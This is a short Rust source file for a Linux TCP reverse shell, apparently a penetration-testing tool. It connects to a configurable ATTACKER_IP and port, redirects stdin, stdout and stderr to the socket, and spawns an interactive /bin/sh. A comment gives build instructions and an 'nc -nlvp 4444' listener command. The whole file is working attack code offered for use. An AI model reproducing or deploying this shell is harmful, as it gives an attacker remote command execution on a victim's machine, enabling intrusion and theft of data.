use std::net::TcpStream;
use std::os::unix::io::AsRawFd;
use std::process::Command;

/*
 * rust-rev-shell - Rust TCP Reverse Shell (Linux)
 *
 * Build:
 *   cargo build --release
 *
 * Listener:
 *   nc -nlvp 4444
 *
 * For Windows, use the std::os::windows module instead.
 */

// -- CONFIGURE THESE --------------------------------------
const ATTACKER_IP: &str = "10.10.10.10";
const ATTACKER_PORT: u16 = 4444;
// ---------------------------------------------------------

fn main() {
    let addr = format!("{}:{}", ATTACKER_IP, ATTACKER_PORT);

    if let Ok(stream) = TcpStream::connect(&addr) {
        let fd = stream.as_raw_fd();

        unsafe {
            libc::dup2(fd, 0); // stdin
            libc::dup2(fd, 1); // stdout
            libc::dup2(fd, 2); // stderr
        }

        Command::new("/bin/sh")
            .arg("-i")
            .status()
            .expect("Failed to spawn shell");
    }
}
